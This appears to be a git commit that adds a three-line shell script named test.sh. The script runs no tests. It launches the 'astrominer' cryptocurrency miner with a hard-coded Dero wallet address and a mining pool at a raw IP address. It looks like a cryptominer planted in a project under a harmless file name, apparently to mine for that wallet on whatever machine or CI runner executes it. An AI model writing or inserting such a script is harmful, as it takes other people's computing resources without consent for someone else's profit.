58eaaec2fcf530187a6efe7b4d6c4eb4d351fb8e
DominicBut <138773917+DominicBut@users.noreply.github.com>
2023-07-06 06:11:14 -0400

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+./astrominer/astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.$(echo kertas-lottery-$(date +"%R-[%d/%m/%y]")) -m 32 -r 149.129.237.206:80  -p rpc
+sleep 3
